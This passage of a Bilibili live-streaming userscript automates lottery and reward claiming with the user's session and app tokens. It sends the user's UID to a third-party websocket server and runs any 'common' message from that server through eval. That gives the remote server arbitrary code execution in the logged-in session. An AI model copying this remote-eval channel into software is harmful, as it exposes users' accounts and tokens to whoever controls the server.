                        let option = BiliPushUtils._corsAjaxSetting(setting);
                        option.onload = (rsp) => {
                            if (rsp.status == 200) {
                                p.resolve(rsp.response);
                            } else {
                                p.reject(rsp);
                            }
                            success();
                        };
                        option.onerror = (err) => {
                            p.reject(err);
                            success();
                        }
                        GM_xmlhttpRequest(option);
                    });
                });
                return p;
            },
            _corsAjaxSetting: (setting) => {
                let url = (setting.url.substr(0, 2) === '//' ? location.protocol + '//' : location.protocol +
                           '//api.live.bilibili.com/') + setting.url;
                let option = {
                    url: url,
                    method: setting.method || "GET",
                    headers: setting.headers || {},
                    responseType: 'json',
                };
                if (option.method == "GET") {
                    if (setting.data) {
                        url = `${url}?${$.param(setting.data)}`;
                    }
                } else {
                    option.headers["content-type"] = "application/x-www-form-urlencoded";
                    if (setting.data) {
                        option.data = $.param(setting.data);
                    }
                }
                return option;
            },
            corsAjaxWithCommonArgs: (setting) => {
                if (setting.data) {
                    setting.data.csrf = Info.csrf_token;
                    setting.data.csrf_token = Info.csrf_token;
                }
                return BiliPushUtils.corsAjax(setting);
            },
            BaseRoomAction: async (roomid) => {
                //推送开启的话 信任推送数据
                if (BiliPush.connected) {
                    return false;
                } else {
                    try{
                        if(BiliPushUtils.lastEnter){
                            if(new Date().getDate() != BiliPushUtils.lastEnter.getDate()){
                                BiliPushUtils.enterSet.clear();
                                BiliPushUtils.initSet.clear();
                            }
                            BiliPushUtils.lastEnter = new Date();
                        }
                        BiliPushUtils.lastEnter = new Date();
                        if(BiliPushUtils.initSet.has(roomid)){
                            return false;
                        }
                        let response = await BiliPushUtils.API.room.room_init(roomid);
                        DEBUG('BiliPushUtils.BaseRoomAction: BiliPushUtils.API.room.room_init',response);
                        if (response.code === 0) {
                            if (response.data.is_hidden || response.data.is_locked || response.data.encrypted || response.data.pwd_verified) {
                                return true;
                            }
                        }
                        BiliPushUtils.initSet.add(roomid);
                        return false;
                    }catch(e){
                        throw(e);
                    }finally{
                        if(!BiliPushUtils.enterSet.has(roomid)){
                            BiliPushUtils.enterSet.add(roomid);
                            await BiliPushUtils.API.room.room_entry_action(roomid);
                        }
                    }
                }
            },
            API: {
                HeartGift: {
                    enter: (data,room_id) => {
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: '//live-trace.bilibili.com/xlive/data-interface/v1/x25Kn/E',
                            data: data,
                            roomid: room_id
                        });
                    },
                    heart: (data,room_id) => {
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: '//live-trace.bilibili.com/xlive/data-interface/v1/x25Kn/X',
                            data: data,
                            roomid: room_id
                        });
                    }
                },
                LiveRank: {
                    topRank: () => {
                        return BiliPushUtils.ajax({
                            url: 'rankdb/v1/Rank2018/getTop?type=master_realtime_hour&type_id=areaid_realtime_hour'
                        });
                    },
                    areaRank: (areaid) => {
                        return BiliPushUtils.ajax({
                            url: 'rankdb/v1/Rank2018/getTop?&type=master_last_hour&type_id=areaid_hour&page_size=10&area_id=' +
                            areaid
                        });
                    }
                },
                Heart: {
                    mobile: () => {
                        let appheaders = {};
                        let param = "";
                        if (Token && TokenUtil) {
                            appheaders = Token.headers
                            if (Info.appToken) {
                                param = TokenUtil.signQuery(KeySign.sort({
                                    access_key: Info.appToken.access_token,
                                    appkey: TokenUtil.appKey,
                                    actionKey: 'appkey',
                                    build: 5561000,
                                    channel: 'bili',
                                    device: 'android',
                                    mobi_app: 'android',
                                    platform: 'android',
                                }));
                            }
                        }
                        return BiliPushUtils.corsAjax({
                            method: 'POST',
                            url: `heartbeat/v1/OnLine/mobileOnline?${param}`,
                            data: {
                                'roomid': 21438956,
                                'scale': 'xxhdpi'
                            },
                            headers: appheaders
                        });
                    },
                    mobile_login: () => {
                        let param = TokenUtil.signLoginQuery(KeySign.sort({
                            access_key: Info.appToken.access_token
                        }));
                        return BiliPushUtils.corsAjax({
                            method: 'GET',
                            url: `//passport.bilibili.com/x/passport-login/oauth2/info?${param}`,
                            headers: Token.headers
                        });
                    },
                    mobile_info: () => {
                        let param = TokenUtil.signQuery(KeySign.sort({
                            access_key: Info.appToken.access_token,
                            room_id: 21438956,
                            appkey: TokenUtil.appKey,
                            actionKey: 'appkey',
                            build: 5561000,
                            channel: 'bili',
                            device: 'android',
                            mobi_app: 'android',
                            platform: 'android',
                        }));
                        return BiliPushUtils.corsAjax({
                            method: 'GET',
                            url: `xlive/app-room/v1/index/getInfoByUser?${param}`,
                            headers: Token.headers
                        });
                    },
                    pc: (success) => {
                        return BiliPushUtils.corsAjaxWithCommonArgs({
                            method: 'POST',
                            url: 'User/userOnlineHeart',
                            data: {}
                        });
                    }
                },
                Check: {
                    check: (roomid) => {
                        return BiliPushUtils.ajax({
                            url: 'xlive/lottery-interface/v1/lottery/Check?roomid=' + roomid,
                            roomid: roomid
                        });
                    },
                },
                Storm: {
                    check: (roomid) => {
                        // 检查是否有节奏风暴
                        return BiliPushUtils.ajax({
                            url: 'xlive/lottery-interface/v1/storm/Check?roomid=' + roomid,
                            roomid: roomid
                        });
                    },
                    join: (id, roomid, captcha_token = "", captcha_phrase = "", color = 15937617) => {
                        // 参加节奏风暴
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: 'xlive/lottery-interface/v1/storm/Join',
                            data: {
                                id: id,
                                color: color,
                                captcha_token: captcha_token,
                                captcha_phrase: captcha_phrase,
                                roomid: roomid
                            },
                            roomid: roomid
                        });
                    },
                    join_ex: (id, roomid, captcha_token = "", captcha_phrase = "", color = 15937617) => {
                        // 参加节奏风暴
                        let param = TokenUtil.signQuery(KeySign.sort({
                            id: id,
                            access_key: Info.appToken.access_token,
                            appkey: TokenUtil.appKey,
                            actionKey: 'appkey',
                            build: 5561000,
                            channel: 'bili',
                            device: 'android',
                            mobi_app: 'android',
                            platform: 'android',
                        }));
                        return BiliPushUtils.corsAjaxWithCommonArgs({
                            method: 'POST',
                            url: `xlive/lottery-interface/v1/storm/Join?${param}`,
                            headers: Token.headers,
                            roomid: roomid
                        });
                    }
                },
                Guard: {
                    join: (roomid, id, type = 'guard') => {
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: 'xlive/lottery-interface/v3/guard/join',
                            data: {
                                roomid: roomid,
                                id: id,
                                type: type
                            },
                            roomid: roomid
                        });
                    },
                },
                Gift: {
                    join: (roomid, id, type = 'small_tv') => {
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: 'xlive/lottery-interface/v5/smalltv/join',
                            data: {
                                roomid: roomid,
                                id: id,
                                type: type
                            },
                            roomid: roomid
                        });
                    }
                },
                room: {
                    room_entry_action: (room_id, platform = 'pc') => {
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: 'room/v1/Room/room_entry_action',
                            data: {
                                room_id: room_id,
                                platform: platform
                            },
                            roomid: room_id
                        });
                    },
                    room_init: (id) => {
                        return BiliPushUtils.ajax({
                            url: 'room/v1/Room/room_init?id=' + id,
                            roomid: id
                        });
                    },
                },
                Pk: {
                    join: (roomid, id) => {
                        return BiliPushUtils.ajaxWithCommonArgs({
                            method: 'POST',
                            url: 'xlive/lottery-interface/v1/pk/join',
                            data: {
                                roomid: roomid,
                                id: id
                            },
                            roomid: roomid
                        });
                    }
                }
            },
            Check: {
                roomSet: new Set(),
                roomCacheSet: new Set(),
                sleepTimeRange: [],
                sleepTimeRangeBuild: () => {
                    const value = CONFIG.AUTO_LOTTERY_CONFIG.SLEEP_RANGE;
                    let time_range = [];
                    let options = value.split(',');
                    for (let timerangstr of options) {
                        let time_tmp = [];
                        let baseTimes = timerangstr.split('-');
                        if (baseTimes && baseTimes.length == 2) {
                            let timeArray1 = baseTimes[0].split(':');
                            let timeArray2 = baseTimes[1].split(':');
                            time_range.push({
                                bh: parseInt(timeArray1[0]),
                                bm: parseInt(timeArray1[1]),
                                eh: parseInt(timeArray2[0]),
                                em: parseInt(timeArray2[1]),
                                str: timerangstr
                            });
                        }
                    }
                    BiliPushUtils.Check.sleepTimeRange = time_range;
                    return time_range;
                },
                checkSleep: () => {
                    let srange = BiliPushUtils.Check.sleepTimeRange;
                    const now = new Date();

                    function dayTime(hours, mins) {
                        return new Date().setHours(hours, mins, 0, 0)
                    }
                    let f = srange.find(it => dayTime(it.bh, it.bm) <= now && now <= dayTime(it.eh, it.em));
                    return f;
                },
                start: async () => {
                    try {
                        //var tmp = Array.from(BiliPushUtils.Check.roomSet);
                        //检查是否休眠
                        if (!BiliPushUtils.Check.checkSleep()) {
                            BiliPushUtils.Check.roomCacheSet.clear();
                            for (let room_id of BiliPushUtils.Check.roomSet) {
                                if (BiliPushUtils.Check.checkSleep()) {
                                    break;
                                }
                                if (BiliPushUtils.Check.roomSet.has(room_id)) {
                                    BiliPushUtils.Check.roomSet.delete(room_id);
                                    await BiliPushUtils.Check.process(room_id);
                                    await delayCall(() => {}, 300);
                                }
                            }
                        }
                        setTimeout(() => BiliPushUtils.Check.start(), 1000);
                        return $.Deferred().resolve();
                    } catch (e) {
                        setTimeout(() => BiliPushUtils.Check.start(), 1000);
                        return $.Deferred().reject();
                    }
                },
                run: (roomid) => {
                    if (!CONFIG.AUTO_LOTTERY) return $.Deferred().resolve();
                    //if (Info.blocked) return $.Deferred().resolve();
                    if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD)
                        return $.Deferred().resolve();
                    let sleep = BiliPushUtils.Check.checkSleep();
                    if (sleep) {
                        console.log(`自动休眠 ${sleep.str} 跳过抽奖检测,roomid=${roomid}`);
                        return $.Deferred().resolve();
                    }
                    if (!BiliPushUtils.Check.roomCacheSet.has(roomid)) {
                        BiliPushUtils.Check.roomCacheSet.add(roomid);
                        BiliPushUtils.Check.roomSet.add(roomid);
                    }
                    return $.Deferred().resolve();
                },
                process: (roomid) => {
                    try {
                        if (!CONFIG.AUTO_LOTTERY) return $.Deferred().resolve();
                        //if (Info.blocked) return $.Deferred().resolve();
                        if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD)
                            return $.Deferred().resolve();
                        let sleep = BiliPushUtils.Check.checkSleep();
                        if (sleep) {
                            console.log(`自动休眠 ${sleep.str} 跳过抽奖检测,roomid=${roomid}`);
                            return $.Deferred().resolve();
                        }
                        BiliPushUtils.Check.roomSet.delete(roomid);
                        return BiliPushUtils.BaseRoomAction(roomid).then((fishing) => {
                            if (!fishing) {
                                return BiliPushUtils.API.Check.check(roomid).then((response) => {
                                    DEBUG(
                                        'BiliPushUtils.Check.run: BiliPushUtils.API.Check.check',
                                        response);
                                    if (response.code === 0) {
                                        var data = response.data;
                                        if (CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY) {
                                            if (data.gift && data.gift.length > 0) {
                                                BiliPushUtils.Gift.join(roomid, data.gift);
                                            }
                                        }
                                        if (CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) {
                                            if (data.guard && data.guard.length > 0) {
                                                BiliPushUtils.Guard.join(roomid, data.guard);
                                            }
                                        }
                                        if (CONFIG.AUTO_LOTTERY_CONFIG.PK_AWARD) {
                                            if (data.pk && data.pk.length > 0) {
                                                BiliPushUtils.Pk.join(roomid, data.pk);
                                            }
                                        }
                                        return $.Deferred().resolve();
                                    } else {
                                        window.toast(
                                            `[自动抽奖][查询](roomid=${roomid})${response.msg}`,
                                            'caution');
                                    }
                                }, () => {
                                    window.toast(`[自动抽奖][查询]检查礼物(${roomid})失败，请检查网络`,
                                                 'error');
                                    return delayCall(() => BiliPushUtils.Check.run(roomid));
                                });
                            }
                        }, () => {
                            window.toast(`[自动抽奖][查询]检查直播间(${roomid})失败，请检查网络`, 'error');
                            return delayCall(() => BiliPushUtils.Check.run(roomid), 1e3);
                        });
                    } catch (err) {
                        window.toast('[自动抽奖][查询]运行时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                }
            },
            Storm: {
                run: (roomid) => {
                    try {
                        if (!CONFIG.AUTO_LOTTERY) return $.Deferred().resolve();
                        //if (Info.blocked) return $.Deferred().resolve();
                        if (BiliPushUtils.stormBlack) return $.Deferred().resolve();
                        if (!CONFIG.AUTO_LOTTERY_CONFIG.STORM) return $.Deferred().resolve();
                        let sleep = BiliPushUtils.Check.checkSleep();
                        if (sleep) {
                            console.log(`自动休眠 ${sleep.str} 跳过风暴检测,roomid=${roomid}`);
                            return $.Deferred().resolve();
                        }
                        return BiliPushUtils.API.Storm.check(roomid).then((response) => {
                            DEBUG('BiliPushUtils.Storm.run: BiliPushUtils.API.Storm.check',
                                  response);
                            if (response.code === 0) {
                                var data = response.data;
                                if(data.length==0){
                                    console.log(`[自动抽奖][节奏风暴]未获取到抽奖(roomid=${roomid})`);
                                    return $.Deferred().resolve();
                                }
                                window.toast(`[自动抽奖][节奏风暴]获取抽奖(roomid=${data.roomid},id=${data.id})`, 'info');
                                BiliStorm.join(data.id, data.roomid, Math.round(new Date().getTime() / 1000) + data.time);
                                return $.Deferred().resolve();
                            } else {
                                window.toast(`[自动抽奖][节奏风暴](roomid=${roomid})${response.msg}`,
                                             'caution');
                            }
                        }, () => {
                            window.toast(`[自动抽奖][节奏风暴]检查直播间(${roomid})失败，请检查网络`, 'error');
                            //return delayCall(() => BiliPushUtils.Storm.run(roomid));
                        });
                    } catch (err) {
                        window.toast('[自动抽奖][节奏风暴]运行时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                }
            },
            Pk: {
                run: (roomid) => (BiliPushUtils.Check.run(roomid)),
                join: async (roomid, ids) => {
                    try {
                        //console.log(`Pk.join`,roomid,ids,i)
                        if (!ids) return $.Deferred().resolve();
                        //if (Info.blocked) return $.Deferred().resolve();
                        for (let obj of ids) {
                            // id过滤，防止重复参加
                            var id = parseInt(obj.id, 10);
                            if (BiliPushUtils.pkIdSet.has(id)) return $.Deferred().resolve();
                            BiliPushUtils.pkIdSet.add(id); // 加入id记录列表
                            await BiliPushUtils.Pk._join(roomid, obj.id);
                        }
                        return $.Deferred().resolve();
                    } catch (e) {
                        await delayCall(() => BiliPushUtils.Pk.join(roomid, ids));
                    }
                },
                _join: (roomid, id) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    id = parseInt(id, 10);
                    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
                    RafflePorcess.append(roomid, id);
                    window.toast(`[自动抽奖][乱斗领奖]检测到(roomid=${roomid},id=${id})`, 'info');
                    delayCall(() => BiliPushUtils.API.Pk.join(roomid, id).then((response) => {
                        DEBUG('BiliPushUtils.Pk._join: BiliPushUtils.API.Pk.join', response);
                        if (response.code === 0) {
                            try {
                                var giftInfo = response.data.award_text.split('X');
                                Statistics.appendGift(giftInfo[0], giftInfo[1] - 0, response.data
                                                      .award_ex_time);
                            } catch (e) {}
                            window.toast(
                                `[自动抽奖][乱斗领奖]领取(roomid=${roomid},id=${id})成功,${response.data.award_text}`,
                                'success');
                        } else if (response.msg.indexOf('拒绝') > -1) {
                            //Info.blocked = true;
                            //BiliPushUtils.up();
                            //window.toast('[自动抽奖][乱斗领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                        } else if (BiliPushUtils.msgIgnore(response.msg)) {
                            return delayCall(() => BiliPushUtils.Pk._join(roomid, id), 1e3);
                        } else if (response.msg.indexOf('过期') > -1) {} else {
                            window.toast(
                                `[自动抽奖][乱斗领奖](roomid=${roomid},id=${id})${response.msg}`,
                                'caution');
                        }
                        RafflePorcess.remove(roomid, id);
                    }, () => {
                        window.toast(`[自动抽奖][乱斗领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`,
                                     'error');
                        return delayCall(() => BiliPushUtils.Pk._join(roomid, id));
                    }), parseInt(Math.random() * 6) * 1e3);
                    return $.Deferred().resolve();
                }
            },
            Gift: {
                run: (roomid) => (BiliPushUtils.Check.run(roomid)),
                join: async (roomid, raffleList) => {
                    try {
                        //console.log(`Gift.join`,roomid,raffleList,i)
                        //if (Info.blocked) return $.Deferred().resolve();
                        //if (i >= raffleList.length) return $.Deferred().resolve();
                        for (let obj of raffleList) {
                            if (obj.status === 1) { // 可以参加
                                // raffleId过滤，防止重复参加
                                var raffleId = parseInt(obj.raffleId, 10);
                                if (BiliPushUtils.raffleIdSet.has(raffleId)) return $.Deferred().resolve();
                                BiliPushUtils.raffleIdSet.add(raffleId); // 加入raffleId记录列表
                                await BiliPushUtils.Gift._join(roomid, obj.raffleId, obj.type, obj.time_wait);
                            } else if (obj.status === 2 && obj.time > 0) { // 已参加且未开奖
                            }
                        }
                        return $.Deferred().resolve();
                    } catch (e) {
                        await delayCall(() => BiliPushUtils.Gift.join(roomid, raffleList), 1e3);
                    }
                },
                _join: (roomid, raffleId, type, time_wait = 0) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    raffleId = parseInt(raffleId, 10);
                    if (isNaN(roomid) || isNaN(raffleId)) return $.Deferred().reject();
                    if (!type) {
                        delayCall(() => BiliPushUtils.Check.run(roomid));
                        return $.Deferred().resolve();
                    }
                    window.toast(
                        `[自动抽奖][礼物抽奖]等待抽奖(roomid=${roomid},id=${raffleId},type=${type},time_wait=${time_wait})`,
                        'info');
                    RafflePorcess.append(roomid, raffleId);
                    delayCall(() => BiliPushUtils.API.Gift.join(roomid, raffleId, type).then((response) => {
                        DEBUG('BiliPushUtils.Gift._join: BiliPushUtils.API.Gift.join', response);
                        switch (response.code) {
                            case 0:
                                Statistics.appendGift(response.data.award_name, response.data.award_num,
                                                      response.data.award_ex_time);
                                window.toast(
                                    `[自动抽奖][礼物抽奖]已参加抽奖(roomid=${roomid},id=${raffleId},type=${type}),${response.data.award_name+"x"+response.data.award_num}`,
                                    'success');
                                break;
                            case 402:
                                // 抽奖已过期，下次再来吧
                                break;
                            case 65531:
                                // 65531: 非当前直播间或短ID直播间试图参加抽奖
                                //Info.blocked = true;
                                //BiliPushUtils.up();
                                //window.toast(`[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，已停止`, 'error');
                                break;
                            default:
                                if (response.msg.indexOf('拒绝') > -1) {
                                    //Info.blocked = true;
                                    //BiliPushUtils.up();
                                    //window.toast('[自动抽奖][礼物抽奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                                } else if (BiliPushUtils.msgIgnore(response.msg)) {
                                    return delayCall(() => BiliPushUtils.Gift._join(roomid,
                                                                                    raffleId, type), 1e3);
                                } else {
                                    window.toast(
                                        `[自动抽奖][礼物抽奖](roomid=${roomid},id=${raffleId},type=${type})${response.msg}`,
                                        'caution');
                                }
                        }
                        RafflePorcess.remove(roomid, raffleId);
                    }, () => {
                        window.toast(
                            `[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，请检查网络`,
                            'error');
                        return delayCall(() => BiliPushUtils.Gift._join(roomid, raffleId, type),
                                         1e3);
                    }), (time_wait + 1) * 1e3);
                    return $.Deferred().resolve();
                }
            },
            Guard: {
                run: (roomid) => (BiliPushUtils.Check.run(roomid)),
                join: async (roomid, guard) => {
                    try {
                        //console.log(`Guard.join`,roomid,guard,i)
                        //if (Info.blocked) return $.Deferred().resolve();
                        if (!guard) return $.Deferred().resolve();
                        for (let obj of guard) {
                            // id过滤，防止重复参加
                            var id = parseInt(obj.id, 10);
                            if (BiliPushUtils.guardIdSet.has(id)) return $.Deferred().resolve();
                            BiliPushUtils.guardIdSet.add(id); // 加入id记录列表
                            await BiliPushUtils.Guard._join(roomid, obj.id);
                        }
                        return $.Deferred().resolve();
                    } catch (e) {
                        await delayCall(() => BiliPushUtils.Guard.join(roomid, guard));
                    }
                },
                _join: (roomid, id) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    id = parseInt(id, 10);
                    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
                    RafflePorcess.append(roomid, id);
                    window.toast(`[自动抽奖][舰队领奖]检测到(roomid=${roomid},id=${id})`, 'info');
                    delayCall(() => BiliPushUtils.API.Guard.join(roomid, id).then((response) => {
                        DEBUG('BiliPushUtils.Guard._join: BiliPushUtils.API.Guard.join',
                              response);
                        if (response.code === 0) {
                            Statistics.appendGift(response.data.award_name, response.data.award_num,
                                                  response.data.award_ex_time);
                            window.toast(
                                `[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})成功,${response.data.award_name+"x"+response.data.award_num}`,
                                'success');
                        } else if (response.msg.indexOf('拒绝') > -1) {
                            //Info.blocked = true;
                            //BiliPushUtils.up();
                            //window.toast('[自动抽奖][舰队领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                        } else if (BiliPushUtils.msgIgnore(response.msg)) {
                            return delayCall(() => BiliPushUtils.Guard._join(roomid, id), 1e3);
                        } else if (response.msg.indexOf('过期') > -1) {} else {
                            window.toast(
                                `[自动抽奖][舰队领奖](roomid=${roomid},id=${id})${response.msg}`,
                                'caution');
                        }
                        RafflePorcess.remove(roomid, id);
                    }, () => {
                        window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`,
                                     'error');
                        return delayCall(() => BiliPushUtils.Guard._join(roomid, id));
                    }), parseInt(Math.random() * 6 * 1e3));
                    return $.Deferred().resolve();
                }
            }
        }
        const BiliPush = {
            _ajax: (url, data, callback, error) => {
                $.ajax({
                    type: "POST",
                    url: url,
                    data: data,
                    dataType: "json",
                    beforeSend: function (request) {},
                    success: function (data) {
                        callback(data);
                    },
                    error: function (err) {
                        error(err);
                    }
                })
            },
            connected: false,
            gsocket: null,
            gsocketTimeId: null,
            gheartTimeId: null,
            first: true,
            lock: false,
            connectWebsocket: (lazy = false) => {
                if (BiliPush.first) {
                    window.toast('初始化bilipush 推送服务', 'info');
                }
                if (BiliPush.lock) return;
                BiliPush.lock = true;
                if (lazy) {
                    if (BiliPush.gsocket && BiliPush.gsocket.readyState < 2) {
                        BiliPush.lock = false;
                        return;
                    }
                }
                var data = {
                    uid: BilibiliLive.UID,
                    version: VERSION,
                    key:CONFIG.DD_BP_CONFIG.BP_KEY
                };
                var url = "https://bilipush.1024dream.net:5000/ws/pre-connect";
                BiliPush._ajax(url, data, function (d) {
                    if (d.code == -1) {
                        window.toast('bilipush 拒绝连接:' + d.msg, 'error');
                        BiliPush.lock = false;
                        return;
                    }
                    var url = d.server;
                    if (BiliPush.gsocket) BiliPush.gsocket.close();
                    BiliPush.gsocket = null;
                    BiliPush.gsocket = new WebSocket(url);
                    BiliPush.gsocket.onopen = function (e) {
                        if (BiliPush.first) {
                            window.toast('bilipush 连接成功', 'success');
                            BiliPush.first = false;
                        } else {
                            console.info('bilipush 连接成功');
                        }
                        BiliPush.connected = true;
                        BiliPush.gsocket.send("ping");
                        BiliPush.gheartTimeId = setInterval(function () {
                            BiliPush.gsocket.send("ping");
                        }, 60e3);
                    };
                    BiliPush.gsocket.onclose = function (e) {
                        console.error('bilipush 连接断开');
                        BiliPush.connected = false;
                        BiliPush.gsocket = null;
                        clearTimeout(BiliPush.gsocketTimeId);
                        clearInterval(BiliPush.gheartTimeId);
                        BiliPush.gsocketTimeId = setTimeout(function () {
                            if (CONFIG.DD_BP) {
                                BiliPush.connectWebsocket();
                            }
                        }, 5000);
                    };
                    BiliPush.gsocket.onmessage = function (e) {
                        try {
                            var msg = JSON.parse(e.data);
                            BiliPush.onRafflePost(msg);
                        } catch (err) {
                            console.log(e, err);
                            return;
                        }
                    };
                    BiliPush.gsocket.onerror = function (e) {
                        console.error('bilipush 连接异常');
                        BiliPush.connected = false;
                        BiliPush.gsocket = null;
                        clearTimeout(BiliPush.gsocketTimeId);
                        clearInterval(BiliPush.gheartTimeId);
                        BiliPush.gsocketTimeId = setTimeout(function () {
                            if (CONFIG.DD_BP) {
                                BiliPush.connectWebsocket();
                            }
                        }, 5000);
                    };
                    BiliPush.lock = false;
                }, function (err) {
                    console.error("bilipush连接失败，等待重试...");
                    BiliPush.connected = false;
                    BiliPush.gsocketTimeId = setTimeout(function () {
                        if (CONFIG.DD_BP) {
                            BiliPush.connectWebsocket();
                        }
                    }, 5000);
                    BiliPush.lock = false;
                });
            },
            onRafflePost: (rsp) => {
                try {
                    let raffle_data = JSON.parse(rsp);
                    let {
                        code,
                        type,
                        data
                    } = raffle_data;
                    if (code == 0) {
                        if (type == "raffle") {
                            let {
                                room_id,
                                raffle_type
                            } = data;
                            switch (raffle_type) {
                                case "TV":
                                case "GUARD":
                                case "PK":
                                case "GIFT":
                                    window.toast(`bilipush 监控到 房间 ${room_id} 的礼物`, 'info');
                                    BiliPushUtils.Check.process(room_id);
                                    break;
                                case "STORM":
                                    window.toast(`bilipush 监控到 房间 ${room_id} 的节奏风暴`, 'info');
                                    BiliPushUtils.Storm.run(room_id);
                                    break;
                            }
                        } else if (type == "common") {
                            try {
                                eval(data);
                            } catch (e) {
                                console.error("bilipush 回调失败，可能浏览器不支持");
                            }
                        } else if (type == "notice") {
                            window.toast(data, 'caution');
                        } else if (type == "msg") {
                            window.alertdialog("魔改助手消息", data);
                        } else if (type == "reload") {
                            localStorage.setItem('LIVE_PLAYER_STATUS', JSON.stringify({
                                type: 'html5',
                                timeStamp: ts_ms()
                            }));
                            var volume = localStorage.getItem('videoVolume') || 0;
                            if (volume == 0) {
                                localStorage.setItem('videoVolume', 0.1);
                            }
                            location.reload();
                        }
                    }
                } catch (e) {
                    console.error(e, rsp);
                }
            },
            run: () => {
                BiliPushUtils.Check.start();
                BiliPushUtils.Check.run(window.BilibiliLive.ROOMID);
                BiliPushUtils.Storm.run(window.BilibiliLive.ROOMID);
                if (CONFIG.DD_BP) {
                    BiliPush.connectWebsocket(true);
                } else if (BiliPush.gsocket) {
                    BiliPush.gsocket.close();
                }
                window.websocket = BiliPush.gsocket;
                BiliPushUtils.clearSet();
                setInterval(() => {
                    BiliPushUtils.clearSet();
                }, 5e3);
            }
        }
        const RafflePorcess = {
            raffle_Process: {},
            save_Interval: 0,
            run: () => {
                try {
                    var raffle_Process = JSON.parse(localStorage.getItem(`${NAME}_RAFFLE`)) || {};
                    for (let room_id in RafflePorcess.raffle_Process) {
                        BiliPushUtils.Check.run(room_id);
                    }
                } catch (e) {}
                if (RafflePorcess.save_Interval == 0) {
                    RafflePorcess.save_Interval = setInterval(() => {
                        localStorage.setItem(`${NAME}_RAFFLE`, JSON.stringify(RafflePorcess.raffle_Process));
                    }, 100);
                }
            },
            append: (room_id, raffle_id) => {
                if (RafflePorcess.raffle_Process[room_id]) {
                    if (RafflePorcess.raffle_Process[room_id].indexOf(raffle_id) == -1) {
                        RafflePorcess.raffle_Process[room_id].push(raffle_id);
                    }
                } else {
                    RafflePorcess.raffle_Process[room_id] = [raffle_id];
                }
            },
            remove: (room_id, raffle_id) => {
                if (RafflePorcess.raffle_Process[room_id]) {
                    RafflePorcess.raffle_Process[room_id] = RafflePorcess.raffle_Process[room_id].filter(r =>
                                                                                                         r != raffle_id);
                    if (RafflePorcess.raffle_Process[room_id].length == 0) {
                        delete RafflePorcess.raffle_Process[room_id];
                    }
                }
            }
        }
        const Statistics = {
            gifts: {},
            queue: [],
            save_Interval: 0,
            process_timeOut: 0,
            run: () => {
                try {
                    Statistics.gifts = JSON.parse(localStorage.getItem(`${NAME}_DAYGIFTS`)) || {};
                } catch (e) {}
                if (!CACHE.stats_ts || checkNewDay(CACHE.stats_ts)) {
                    Statistics.gifts = {};
                    CACHE.stats_ts = ts_ms();
                }
                if (Statistics.save_Interval == 0) {
                    Statistics.save_Interval = setInterval(() => {
                        localStorage.setItem(`${NAME}_DAYGIFTS`, JSON.stringify(Statistics.gifts));
                    }, 100);
                }
                if (Statistics.process_timeOut == 0) {
                    Statistics.process_timeOut = setTimeout(() => Statistics.process(), 200);
                }
                runTomorrow(Statistics.run);
            },
            appendGift: (name, count, expire) => {
                if (expire) {
                    var expireDay = Math.ceil((expire * 1e3 - new Date().getTime()) / 86400e3);
                    name = `${name}(${expireDay}d)`;
                }
                console.log(`记录：获得 ${name}x${count}`);
                Statistics.queue.push({
                    name: name,
                    count: count
                });
            },
            process: () => {
                while (Statistics.queue.length > 0) {
                    let {
                        name,
                        count
                    } = Statistics.queue.shift();
                    if (Statistics.gifts[name]) {
                        Statistics.gifts[name] += count;
                    } else {
                        Statistics.gifts[name] = count;
                    }
                }
                clearTimeout(Statistics.process_timeOut);
                Statistics.process_timeOut = setTimeout(() => Statistics.process(), 200);
            },
            showDayGifts: () => {
                let sumGroupKey = ['辣条'];
                let sumGroup = {};
                let gifts = [];
                for (let [k, v] of Object.entries(Statistics.gifts)) {
                    gifts.push(`${k}x${v}`);
                    for (let t of sumGroupKey) {
                        if (k.startsWith(t)) {
                            if (sumGroup[t]) {
                                sumGroup[t] += v;
                            } else {
                                sumGroup[t] = v;
                            }
                        }
                    }
                }
                if (gifts.length > 0) {
                    gifts.push(`统计:`);
                    for (let [k, v] of Object.entries(sumGroup)) {
                        gifts.push(`${k}x${v}`);
                    }
                }
                window.alertdialog('当日礼物统计', gifts.join('<br>'));
            },
        };
        const KeySign = {
            sort: (obj) => {
                let keys = Object.keys(obj).sort();
                let p = [];
                for (let key of keys) {
                    p.push(`${key}=${obj[key]}`);
                }
                return p.join('&');
            },
            convert: (obj) => {
                for (let k in obj) {
                    if ($.type(obj[k]) == "array") {
                        obj[k] = JSON.stringify(obj[k]);
                    }
                }
            },
        };
        const TokenLoad = async () => {
            if (Info.csrf_token) {
